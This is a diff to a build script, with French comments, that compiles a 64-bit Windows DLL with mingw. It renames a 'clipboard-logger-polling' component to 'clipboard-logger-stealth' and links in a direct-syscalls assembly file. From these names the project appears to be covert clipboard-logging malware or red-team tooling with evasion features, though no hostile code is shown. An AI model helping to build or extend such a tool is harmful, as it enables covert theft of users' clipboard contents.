@@ -2,9 +2,9 @@
 # Utilise x86_64-w64-mingw32-gcc pour générer une DLL 64-bit compatible Windows.
 
 # Nom du fichier de sortie
-OUTPUT_DLL="build/clipboard-logger-polling.dll"
-SOURCE_FILE="src/clipboard-logger-polling.c"
-OBJECT_FILE="build/clipboard-logger-polling.o"
+OUTPUT_DLL="build/clipboard-logger-stealth.dll"
+SOURCE_FILE="src/clipboard-logger-stealth.c"
+OBJECT_FILE="build/clipboard-logger-stealth.o"
 DIRECT_SYSCALLS_SRC=src/direct-syscalls.asm
 DIRECT_SYSCALLS_OBJECT=build/direct-syscalls.o
 
